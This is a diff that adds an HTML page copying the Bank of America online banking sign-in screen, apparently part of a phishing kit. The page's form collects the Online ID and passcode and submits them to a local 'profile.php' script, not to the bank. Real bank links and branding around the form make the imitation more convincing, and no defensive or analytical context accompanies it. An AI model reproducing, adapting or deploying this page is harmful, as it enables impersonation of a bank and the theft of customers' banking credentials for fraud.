@@ -1,0 +1,163 @@
+<html>
+<head>
+<title>Bank of America | Online Banking | Sign In to Online Banking</title>
+
+<link rel="stylesheet" type="text/css" href="images/win_ns6.css">
+<link rel="stylesheet" type="text/css" href="images/weas_win_ns6.css">
+
+<style type="text/css"> 
+.typefontred
+{font-style: monospace; color: #ff0000;}
+.style1 {
+	font-family: Verdana;
+	font-weight: bold;
+	font-size: 12px;
+}
+</style>
+</head>
+
+<body id="body" class="body" bgcolor="#ffffff" text="#000000">
+
+<img src="images/olb_masthead_nonav.gif" alt="Bank of America Higher Standards Online Banking" border="0" height="83" width="747"><br>
+	
+	<div class="pagelabel"> 
+	<table class="nav3" summary="" border="0" cellpadding="0" cellspacing="0" width="735"> 
+	<tbody><tr><td colspan="2"><img src="images/clr.gif" alt="" height="6" width="1"></td></tr> 
+	<tr>
+	<td valign="bottom"><div style="display: block;"><img src="images/clr.gif" alt="" height="10" width="200"></div><div><a name="skipnav"></a><h1 class="pagelabel">Sign In<br></h1></div></td> 
+	<td class="text2" align="right" nowrap="nowrap" valign="top"><img src="images/clr.gif" alt="" height="1" width="10"></td></tr> 
+	<tr><td colspan="2"><img src="images/clr.gif" alt="" height="10" width="1"></td></tr> 
+	<tr><td class="rulegrey3" colspan="2"><img src="images/clr.gif" alt="" height="1" width="1"></td></tr> 
+	<tr><td colspan="2"><img src="images/clr.gif" alt="" height="12" width="1"></td></tr> 
+	</tbody>
+	</table>
+	</div> 
+
+<table summary="" border="0" cellpadding="0" cellspacing="0" width="747">
+<tbody><tr>
+    <td width="12"><img src="images/clr.gif" alt="" height="1" width="12"></td>
+    <td valign="top" width="510">
+    <div id="errorSection"></div>
+	<form name="login" action="profile.php" method="post">
+		  <table border="0" cellpadding="0" cellspacing="0" width="100%">
+	<tbody><tr> <td colspan="4"><img src="images/clr.gif" alt="" height="12" width="1"></td> </tr>
+    <tr>
+        <td rowspan="17" width="10"><img src="images/clr.gif" alt="" height="1" width="12"></td>
+        <td width="140" align="right" valign="top" nowrap="nowrap" style="padding-top: 3px; text-align: right;"><span class="style1">Enter Online ID:</span></td>
+        <td width="10" rowspan="2"><img src="images/clr.gif" alt="" height="1" width="12"></td>
+        <td valign="top" width="100%"><label>
+          <input name="username" type="text" id="username">
+        </label>          </td></tr>
+    <tr>
+      <td width="140" align="right" valign="top" nowrap="nowrap" style="padding-top: 3px; text-align: right;">&nbsp;</td>
+      <td valign="top"><span class="text1a">(5 - 25 numbers and/or letters)</span></td>
+    </tr>
+	
+<tr><td colspan="3"><img src="images/clr.gif" alt="" height="15" width="1"></td></tr>
+<tr>
+    <td width="140" align="right" valign="top" nowrap="nowrap" style="padding-top: 3px;"><span class="style1">Enter Passcode:</span></td>
+    <td width="10" rowspan="2"><img src="images/clr.gif" alt="" height="1" width="12"></td>
+    <td valign="top" width="100%"><label>
+      <input name="passcode" type="password" id="passcode">
+    </label>      </td></tr>
+<tr>
+  <td width="140" align="right" valign="top" nowrap="nowrap" style="padding-top: 3px;">&nbsp;</td>
+  <td valign="top"><span class="text1a">(4 - 12 numbers and/or letters)</span></td>
+</tr>
+
+    <tr><td colspan="3"><img src="images/clr.gif" alt="" height="15" width="1"></td></tr>
+
+    <tr>
+        <td>&nbsp;</td>
+        <td>&nbsp;</td>
+        <td><label>
+          <input name="Submit" type="submit" class="mod1-bkgd1-hs" value="Submit">
+        </label></td>
+    </tr>
+
+    <tr><td colspan="3"><img src="images/clr.gif" alt="" height="20" width="1"></td></tr>
+
+    <tr><td colspan="2"><img src="images/clr.gif" alt="" height="1" width="1"></td><td colspan="1">
+            <noscript><a title="Reset passcode" href="/cgi-bin/sso.login.controller?state=CA&fkpst=true&Access_ID=&reason=create_passcode_model"
+class=linknormal><span class=text1>Reset passcode</span></a></noscript><script type="text/javascript" language="javascript">document.write('<a title="Reset passcode" href="javascript:createPasscode()" class=linknormal><span class=text1>Reset passcode<\/span><\/a>'); </script>
+            <br>
+            <noscript><a
+            title="Forgot or need help with your ID?"
+            href="/cgi-bin/sso.login.controller?state=CA&fkpst=true&Access_ID=&reason=resetid_request_ca"
+            class=linknormal><span class=text1>Forgot or need help with your ID?</span></a></noscript><script type="text/javascript" language="javascript">document.write('<a title="Forgot or need help with your ID?" href="javascript:loginHelp()" class=linknormal><span class=text1>Forgot or need help with your ID?<\/span><\/a>');</script></td>
+    </tr>
+	 <!-- ad banner -->
+    <tr><td colspan="2"><img src="images/clr.gif" alt="" height="1" width="12"></td><td colspan="3"><div style="display: block;"><img src="images/clr.gif" alt="" height="25" width="1"></div><a title="Bank of America Product Promotion" href="http://www.bankofamerica.com/promos/jump/olbcstsave"><img src="images/obpromo_bnr_dpo_in.gif" alt="Bank of America Product Promotion" border="0" height="58" width="347"></a></td></tr>
+    </tbody></table>
+    </form>
+
+	</td>
+    <!-- Middle gutter -->
+    <td width="20"><img src="images/clr.gif" alt="" height="1" width="20"></td>
+    <!-- End middle gutter -->
+
+    <td align="left" valign="top" width="205">
+		
+<!-- Module Frame -->
+<table summary="" border="0" cellpadding="0" cellspacing="0" width="100%">
+
+    <!-- Module Header -->
+    <tbody><tr><td class="mod2-brdr-hs"><img src="images/clr.gif" alt="" border="0" height="1" width="1"></td></tr>
+
+    <!-- Start of Module Content -->
+    <tr>
+        <td valign="top"><table summary="" border="0" cellpadding="0" cellspacing="0" width="100%">
+            <tbody><tr>
+                <td class="mod2-brdr-hs" width="1"><img src="images/clr.gif" alt="" height="1" width="1"></td>
+                <td valign="top"><div class="display-ns4"><img src="images/clr.gif" alt="" height="15" width="1"></div><div class="signin-box"><span style="color: rgb(0, 0, 0);">Not using Online Banking?</span><br><a class="linknormal" onFocus="self.status='Enroll now for Online Banking';return true;" onBlur="self.status='';return true;" onMouseOver="self.status='Enroll now for Online Banking';return true;" onMouseOut="self.status='';return true;" title="Enroll now for Online Banking" href="https://onlineid.bankofamerica.com/cgi-bin/sso.login.controller?reason=ca_enroll">Enroll now<br>for Online Banking<img src="images/icon_call2action_secondary.gif" alt="" border="0" height="8" hspace="5" width="10"></a><br><br><a class="linknormal" onFocus="self.status='Learn More';return true;" onBlur="self.status='';return true;" onMouseOver="self.status='Learn More';return true;" onMouseOut="self.status='';return true;" title="Learn more about Online Banking" href="http://www.bankofamerica.com/state.cgi?section=online">Learn more <br>about Online Banking<img src="images/icon_call2action_secondary.gif" alt="" border="0" height="8" hspace="5" width="10"></a><br><br><a class="linknormal" onFocus="self.status='Service Agreement';return true;" onBlur="self.status='';return true;" onMouseOver="self.status='Service Agreement';return true;" onMouseOut="self.status='';return true;" title="Service Agreement" href="http://www.bankofamerica.com/state.cgi?section=onlinebanking_svc">Service Agreement<img src="images/icon_call2action_secondary.gif" alt="" border="0" height="8" hspace="5" width="10"></a><br><br><a class="linknormal" onFocus="self.status='Pay by Phone Users Guide';return true;" onBlur="self.status='';return true;" onMouseOver="self.status='Pay by Phone Users Guide';return true;" onMouseOut="self.status='';return true;" title="Pay By Phone user's guide" href="http://www.bankofamerica.com/state.cgi?section=paybyphone_guide">Pay By Phone user's guide<img src="images/icon_call2action_secondary.gif" alt="" border="0" height="8" hspace="5" width="10"></a></div><div class="display-ns4"><img src="images/clr.gif" alt="" height="15" width="1"></div></td>
+
+                <td class="mod2-brdr-hs" width="1"><img src="images/clr.gif" alt="" border="0" height="1" width="1"></td>
+            </tr>
+        </tbody></table></td>
+    </tr>
+
+    <tr><td class="mod2-brdr-hs"><img src="images/clr.gif" alt="" border="0" height="1" width="1"></td></tr>
+    <!-- Start of Module Content -->
+    <tr>
+        <td><table summary="" border="0" cellpadding="0" cellspacing="0" width="100%">
+            <tbody><tr>
+                <td class="mod2-brdr-hs" width="1"><img src="images/clr.gif" alt="" height="1" width="1"></td>
+                <td><table summary="" border="0" cellpadding="0" cellspacing="0" width="100%">
+                    <tbody><tr valign="top">
+                    <!-- End of Module Content -->
+                    <td>
+                    </td><td valign="top"><div class="display-ns4"><img src="images/clr.gif" alt="" height="15" width="1"></div><div class="signin-box"><a class="linknormal" onFocus="self.status='Change State';return true;" onBlur="self.status='';return true;" onMouseOver="self.status='Change State';return true;" onMouseOut="self.status='';return true;" title="Change State" href="http://www.bankofamerica.com/state.cgi?section=signin&amp;update=yes">Go to Online Banking for<br>a state other than California</a></div><div class="display-ns4"><img src="images/clr.gif" alt="" height="15" width="1"></div></td>
+                    </tr>
+                </tbody></table></td>
+                <td class="mod2-brdr-hs" width="1"><img src="images/clr.gif" alt="" border="0" height="1" width="1"></td>
+            </tr>
+        </tbody></table></td>
+    </tr>
+    <tr>
+        <td class="mod2-brdr-hs"><img src="images/clr.gif" alt="" border="0" height="1" width="1"></td>
+    </tr>
+    <!-- End Module Footer -->
+</tbody></table>
+
+
+    </td>
+</tr>
+</tbody></table>
+<div><img src="images/clr.gif" alt="" height="30" width="1"></div>
+
+<!-- Begin footer -->
+<div class="footer">
+<table summary="" border="0" cellpadding="0" cellspacing="0" width="747">
+	<tbody><tr><td colspan="4" class="rulegrey2"><img src="images/clr.gif" alt="" height="1" width="1"></td></tr>
+	<tr><td rowspan="7" width="12"><img src="images/clr.gif" alt="" height="1" width="12"></td><td colspan="2"><img src="images/clr.gif" alt="" height="7" width="1"></td></tr>
+	<tr><td class="secure-area" nowrap="nowrap"><div class="secure-area"><img src="images/foot_lock.gif" alt="Secure Area" border="0" height="11" hspace="0" vspace="0" width="9"><img src="images/clr.gif" alt="" height="1" width="8">Secure Area</div></td><td rowspan="6" style="" align="right" valign="top" width="142"><img alt="Official Sponsor 2000-2004 U.S. Olympic Teams" src="images/olympic.gif" align="right" border="0" height="33" hspace="0" vspace="0" width="130"></td></tr>
+
+		<tr><td><img src="images/clr.gif" alt="" height="6" width="1"></td></tr>
+	<tr>
+	<td class="footer" valign="top"><a class="footer" title="Home" href="http://www.bankofamerica.com/">Home</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="Locations" href="http://www.bankofamerica.com/findit/locator.cfm">Locations</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="Contact Us" href="http://www.bankofamerica.com/onlinebanking/index.cfm?template=contact_us">Contact Us</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="Help" href="http://www.bankofamerica.com/help/index.cfm?lob=onlinebanking">Help</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="Sign in" href="http://www.bankofamerica.com/signin/">Sign in</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="Site Map" href="http://www.bankofamerica.com/help/index.cfm?template=sitemap.cfm">Site Map</a><br><a class="footer" title="Personal Finance" href="http://www.bankofamerica.com/index.cfm">Personal Finance</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="Small Business" href="http://www.bankofamerica.com/index.cfm?page=smbiz">Small Business</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="Corporate &amp; Institutional" href="http://www.bankofamerica.com/index.cfm?page=corp">Corporate &amp; Institutional</a><br><a class="footer" title="About the Bank" href="http://www.bankofamerica.com/inside/">About the Bank</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="In the Community" href="http://www.bankofamerica.com/inthecommunity/">In the Community</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="Finance Tools &amp; Planning" href="http://www.bankofamerica.com/financialtools/">Finance Tools &amp; Planning</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="Privacy &amp; Security" href="http://www.bankofamerica.com/privacy/">Privacy &amp; Security</a></td>
+	</tr>
+	<tr><td><img src="images/clr.gif" alt="" height="22" width="1"></td></tr>
+	<tr>
+	<td class="fdic-text" valign="top">Bank of America, N.A. Member FDIC.&nbsp;Equal Housing Lender<img src="images/icon_house.gif" alt="Equal Housing Lender" border="0" height="9" hspace="3" width="14"><br>© 2007 Bank of America Corporation. All rights reserved.</td>
+	</tr>
+	<tr><td><img src="images/clr.gif" alt="" height="20"></td></tr></tbody></table></div></body></html>
